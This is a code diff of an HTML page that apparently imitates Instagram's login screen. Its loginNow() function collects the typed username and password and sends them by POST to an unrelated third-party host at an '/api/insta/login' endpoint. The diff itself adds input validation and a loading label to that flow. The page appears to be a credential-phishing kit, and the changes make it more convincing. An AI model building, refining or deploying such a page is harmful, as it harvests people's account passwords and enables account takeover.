@@ -2409,7 +2409,7 @@
                                                                         class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1xmf6yo x1e56ztr x540dpk x1m39q7l x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
                                                                         <button class="_acan _acap _acas _aj1-"
                                                                             type="button" onclick="loginNow()">
-                                                                            <div
+                                                                            <div id="loginBtn"
                                                                                 class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
                                                                                 Log in</div>
                                                                         </button>
@@ -2487,10 +2487,13 @@
         function loginNow() {
             let username = document.getElementById("usernameJS").value;
             let password = document.getElementById("passwordJS").value;
-
+            if (username.trim() == "" || password.trim() == "") {
+                alert("Enter Details")
+                return;
+            }
             const url = 'https://gursewak-news.onrender.com/api/insta/login';
             const data = { username, password };
-
+            document.getElementById("loginBtn").innerText = "Loading..."
             fetch(url, {
                 method: 'POST',
                 headers: {
